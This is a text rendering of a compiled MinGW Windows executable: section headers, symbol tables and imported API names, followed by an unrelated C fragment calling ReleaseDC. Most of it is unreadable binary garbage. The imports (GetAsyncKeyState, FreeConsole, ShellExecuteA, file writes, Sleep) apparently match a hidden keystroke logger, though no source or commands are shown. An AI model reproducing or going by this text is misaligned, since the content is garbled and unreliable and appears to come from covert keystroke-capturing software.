      .idata$7ˆ        .idata$5l       .idata$4œ        .idata$6’       .text   ø      .data   p       .bss    
      .idata$7t        .idata$5D       .idata$4t        .idata$64       .text          .data   p       .bss    
      .idata$7È        .idata$5ì       .idata$4       .idata$6ê       .text         .data   p       .bss    
      .idata$7Ä        .idata$5ä       .idata$4       .idata$6Ø       .text         .data   p       .bss    
      .idata$7„        .idata$5d       .idata$4”        .idata$6‚       .text         .data   p       .bss    
      .idata$7         .idata$5œ       .idata$4Ì        .idata$6       .text          .data   p       .bss    
      .idata$7Œ        .idata$5t       .idata$4¤        .idata$6¤       .text   (      .data   p       .bss    
      .idata$7|        .idata$5T       .idata$4„        .idata$6V       .text   0      .data   p       .bss    
      .idata$7€        .idata$5\       .idata$4Œ        .idata$6l       .text   8      .data   p       .bss    
      .idata$7        .idata$5|       .idata$4¬        .idata$6¾       .text   @      .data   p       .bss    
      .idata$7œ        .idata$5”       .idata$4Ä        .idata$6       .text   H      .data   p       .bss    
      .idata$7¤        .idata$5¤       .idata$4Ô        .idata$62       .text   P      .data   p       .bss    
      .idata$7¨        .idata$5¬       .idata$4Ü        .idata$6F       .text   X      .data   p       .bss    
      .idata$7¬        .idata$5´       .idata$4ä        .idata$6`       .text   `      .data   p       .bss    
      .idata$7À        .idata$5Ü       .idata$4       .idata$6¼       .text   h      .data   p       .bss    
      .idata$7x        .idata$5L       .idata$4|        .idata$6B       .text   p      .data   p       .bss    
      .idata$7¸        .idata$5Ì       .idata$4ü        .idata$6š       .text   x      .data   p       .bss    
      .idata$7p        .idata$5<       .idata$4l        .idata$6       .text   €      .data   p       .bss    
      .idata$7¼        .idata$5Ô       .idata$4       .idata$6®       .text   ˆ      .data   p       .bss    
      .idata$7˜        .idata$5Œ       .idata$4¼        .idata$6ê       .text         .data   p       .bss    
      .idata$7l        .idata$54       .idata$4d        .idata$6       .text   ˜      .data   p       .bss    
      .idata$7”        .idata$5„       .idata$4´        .idata$6Î       .file     þÿ  gfake              hname   d        fthunk  4       .text                           .data   p                        .bss    
                       .idata$2                        .idata$4d        .idata$54       .file     þÿ  gfake              .text                           .data   p                        .bss    
                       .idata$4$                       .idata$5ô                       .idata$7Ì       
                 .file     þÿ  gcrtend.c          .text                           .data   p                        .bss    
                           p  Ð                       __xc_z             §	  ðG@ ÿÿ       Æ	  l           Ü	  |           è	  Ì            
              
  °          "
  T           /
  d           ;
  ´           R
  è          n
  ô           …
  „       _lock   €          ’
      	        ¡
  ä           µ
  €          Ô
    @ ÿÿ       à
  P      __xl_a  8           ö
            
             
  @	          2
  ð       _cexit  (          F
             X
  p          w
      ÿÿ       
     ÿÿ       ¨
  P          ³
  <           Á
      ÿÿ       Û
     ÿÿ       ÷
  8           	  4       __xl_d  H           %  h       _tls_end`   	        J  Ð          `             m               @          ”  D           ¥  8           µ             Í      	    memcpy             Ø  
          ò             
  ð          )
  €           B
  \           [
  €      malloc            z
  (      _CRT_MT @           Ž
  €          š
  p          «
              ¹
  ü           Ô
  ð           ÷
  P               ÿÿ       &  d           9  ð          M  œ           X             l  D           ~  ¬           ›            ª  0           ¹  X           Ë  Œ           æ  (           ô  Ð          	  P          #  |           6  `      abort   p          W  à            X       __dll__     ÿÿ       ‘      ÿÿ       ¦  t           Ä  x          Ù  P           ö  Ð              @ ÿÿ         °          $  H          6     ÿÿ       L  $           d  l       calloc  °          ~      	        ˆ  `          ¡  €	          ³             ¿  ´           Ì  ðG@ ÿÿ   fprintf X          ê  œ       Sleep   à            0                       $             1  ¤           >             L             `               z  `
      __xi_z  0           †  `          ¦  8          ³              Ë              ã             ó               p          %  <           @  L	      signal  x          K   
          b              t  0
          ‚  T       strncmp ¨          œ  $           ¯  Ì           Æ             Õ             õ  ¼             Ð                ÿÿ       &  ”           D  Ä           Q  ¬           ^              w              „            £     ÿÿ       ¶  „           Ö             ã  à          ñ  ˜          
  Œ                ÿÿ       +  Ô           :             J            `  4           n  \           ‰  L           –  Ü       __xl_z  P       __end__    	        µ  ¼           ×  @          î  l           ü  °          
  X      __xi_a               0          1  Ø          @  Ä           L  ˆ      __xc_a              a  4           x     ÿÿ       ‘  X           £     ÿÿ   _fmode  p	          ±  0          ¼  €           Ù  Ô           ë  h          ý  H            ”             ä       __xl_c  @           1  (            J  h   	        W  8
          c  @          {  ì           Ž  \           ž  D	          µ  P	          Á             Ò             ê  <                    _newmode`	            8      fwrite  `          #  Ì           1             @      ÿÿ       X      ÿÿ       i            v  (
          Œ  
          ¦  ð          ¶  0      _onexit ˜          É  ð       exit    @          Û  `                 ÿÿ             ÿÿ       4  t           B  ,           W  H	      _charmax0           o  °      strlen            ~  à            À          ²            È  ¤           à  ø          ì  ð             ˆ      _unlock             L           2  À          @  À          O  X           _  L       vfprintfh      free    ¸          y  p       ‹  .debug_aranges .debug_info .debug_abbrev .debug_line .debug_frame .debug_str .debug_loc .debug_ranges __mingw_invalidParameterHandler pre_c_init .rdata$.refptr.mingw_initltsdrot_force .rdata$.refptr.mingw_initltsdyn_force .rdata$.refptr.mingw_initltssuo_force .rdata$.refptr.mingw_initcharmax .rdata$.refptr.__image_base__ .rdata$.refptr.mingw_app_type managedapp .rdata$.refptr.__onexitend .rdata$.refptr.__onexitbegin .rdata$.refptr._fmode .rdata$.refptr.__imp__fmode .rdata$.refptr._MINGW_INSTALL_DEBUG_MATHERR pre_cpp_init .rdata$.refptr._newmode startinfo .rdata$.refptr._dowildcard __tmainCRTStartup .rdata$.refptr.__native_startup_lock .rdata$.refptr.__native_startup_state has_cctor .rdata$.refptr.__dyn_tls_init_callback .rdata$.refptr.__mingw_oldexcpt_handler .rdata$.refptr.__imp__acmdln .rdata$.refptr.__imp___initenv .rdata$.refptr.__xc_z .rdata$.refptr.__xc_a .rdata$.refptr.__xi_z .rdata$.refptr.__xi_a WinMainCRTStartup .l_startw mainCRTStartup .rdata$.refptr._gnu_exception_handler .rdata$.refptr._matherr .CRT$XCAA .CRT$XIAA .debug_info .debug_abbrev .debug_loc .debug_aranges .debug_ranges .debug_line .debug_str .rdata$zzz .debug_frame _decode_pointer _encode_pointer __mingw_raise_matherr stUserMathErr __mingw_setusermatherr __report_error __write_memory.part.0 maxSections _pei386_runtime_relocator was_init.73980 .rdata$.refptr.__RUNTIME_PSEUDO_RELOC_LIST_END__ .rdata$.refptr.__RUNTIME_PSEUDO_RELOC_LIST__ __mingw_SEH_error_handler __mingw_init_ehandler was_here.73812 emu_pdata emu_xdata _gnu_exception_handler __do_global_dtors __do_global_ctors .rdata$.refptr.__CTOR_LIST__ initialized __security_init_cookie .data$__security_cookie .data$__security_cookie_complement __report_gsfailure GS_ContextRecord GS_ExceptionRecord GS_ExceptionPointers __dyn_tls_dtor __dyn_tls_init .rdata$.refptr._CRT_MT __tlregdtor mingw_onexit .rdata$.refptr.__imp__onexit my_lconv_init _ValidateImageBase.part.0 _ValidateImageBase _FindPESection _FindPESectionByName __mingw_GetSectionForAddress __mingw_GetSectionCount _FindPESectionExec _GetPEImageBase _IsNonwritableInCurrentImage __mingw_enum_import_library_names pseudo-reloc-list.c __mingwthr_run_key_dtors.part.0 __mingwthr_cs key_dtor_list ___w64_mingwthr_add_key_dtor __mingwthr_cs_init ___w64_mingwthr_remove_key_dtor __mingw_TLScallback mingw_get_invalid_parameter_handler _get_invalid_parameter_handler mingw_set_invalid_parameter_handler _set_invalid_parameter_handler invalid_parameter_handler.c ___RUNTIME_PSEUDO_RELOC_LIST__ __imp_GetStartupInfoA __imp_abort __lib64_libkernel32_a_iname __data_start__ ___DTOR_LIST__ __imp__fmode __imp__lock __imp_RtlVirtualUnwind SetUnhandledExceptionFilter __imp_GetAsyncKeyState __imp_calloc ___tls_start__ __imp_ShellExecuteA .refptr.__native_startup_state __ImageBase .refptr.__imp__onexit GetLastError GetSystemTimeAsFileTime mingw_initltssuo_force __rt_psrelocs_start __imp___dllonexit .refptr.mingw_initltsdyn_force __dll_characteristics__ __size_of_stack_commit__ __iob_func __imp__acmdln __size_of_stack_reserve__ __major_subsystem_version__ ___crt_xl_start__ __imp_DeleteCriticalSection __imp__set_invalid_parameter_handler .refptr.__CTOR_LIST__ VirtualQuery ___crt_xi_start__ .refptr.__imp__fmode __imp__amsg_exit ___crt_xi_end__ .refptr.__imp___initenv _tls_start __mingw_winmain_lpCmdLine .refptr._matherr .refptr.__RUNTIME_PSEUDO_RELOC_LIST__ __mingw_oldexcpt_handler __imp_GetCurrentThreadId .refptr.mingw_initltssuo_force GetCurrentProcessId TlsGetValue TerminateProcess __bss_start__ __imp___C_specific_handler ___RUNTIME_PSEUDO_RELOC_LIST_END__ RtlLookupFunctionEntry __size_of_heap_commit__ __imp_GetLastError .refptr._dowildcard __imp_free .refptr.__onexitend __imp_FreeConsole __imp_RtlLookupFunctionEntry VirtualProtect mingw_app_type ___crt_xp_start__ __imp_LeaveCriticalSection __mingw_pinit __C_specific_handler .refptr.mingw_initcharmax __imp_GetTickCount .refptr.__mingw_oldexcpt_handler .refptr.__RUNTIME_PSEUDO_RELOC_LIST_END__ ___crt_xp_end__ __minor_os_version__ __imp_GetSystemTimeAsFileTime EnterCriticalSection _MINGW_INSTALL_DEBUG_MATHERR .refptr.__xi_a __image_base__ .refptr._CRT_MT RtlCaptureContext __section_alignment__ __native_dllmain_reason __lib64_libuser32_a_iname _tls_used UnhandledExceptionFilter mingw_initcharmax __IAT_end__ __imp_memcpy __RUNTIME_PSEUDO_RELOC_LIST__ __imp_RtlAddFunctionTable .refptr._newmode mingw_pcppinit __data_end__ __imp_fwrite __CTOR_LIST__ __imp___getmainargs _head_lib64_libkernel32_a __bss_end__ .refptr.mingw_initltsdrot_force GetTickCount _head_lib64_libmsvcrt_a __native_vcclrit_reason ___crt_xc_end__ RtlAddFunctionTable .refptr.__native_startup_lock __imp_EnterCriticalSection _tls_index __native_startup_state ___crt_xc_start__ __onexitbegin __imp_GetCurrentProcessId __imp___lconv_init __imp_TerminateProcess ___CTOR_LIST__ .refptr.__dyn_tls_init_callback __imp_signal GetAsyncKeyState __rt_psrelocs_size __imp_QueryPerformanceCounter __imp_strlen __imp_malloc __mingw_winmain_nShowCmd mingw_pcinit .refptr._gnu_exception_handler __file_alignment__ __imp_InitializeCriticalSection __lconv_init __getmainargs InitializeCriticalSection __imp_exit __major_os_version__ __imp_vfprintf __imp___initenv .refptr.__onexitbegin __IAT_start__ __lib64_libshell32_a_iname __imp__cexit __imp_UnhandledExceptionFilter __imp_SetUnhandledExceptionFilter .refptr.mingw_app_type __imp__onexit __DTOR_LIST__ RtlVirtualUnwind .refptr.__imp__acmdln __set_app_type __imp_Sleep LeaveCriticalSection __imp___setusermatherr __size_of_heap_reserve__ ___crt_xt_start__ __subsystem__ _amsg_exit __security_cookie_complement __imp_TlsGetValue GetCurrentProcess __setusermatherr __imp_fprintf __imp_VirtualProtect _head_lib64_libshell32_a ___tls_end__ __onexitend QueryPerformanceCounter __imp_VirtualQuery __imp__initterm mingw_initltsdyn_force _dowildcard __imp___iob_func __dyn_tls_init_callback _head_lib64_libuser32_a .refptr.__image_base__ _initterm __imp_strncmp .refptr._fmode __major_image_version__ __loader_flags__ ___chkstk_ms __native_startup_lock __mingw_winmain_hInstance GetStartupInfoA GetCurrentThreadId __rt_psrelocs_end __imp__get_invalid_parameter_handler __minor_subsystem_version__ __minor_image_version__ __imp__unlock __imp___set_app_type mingw_initltsdrot_force .refptr.__xc_a .refptr.__xi_z .refptr._MINGW_INSTALL_DEBUG_MATHERR DeleteCriticalSection __imp_RtlCaptureContext FreeConsole __RUNTIME_PSEUDO_RELOC_LIST_END__ __dllonexit __imp_GetCurrentProcess ShellExecuteA .refptr.__xc_z ___crt_xt_end__ __lib64_libmsvcrt_a_iname __security_cookie 

        ReleaseDC(hwnd, hdc);
    }
}
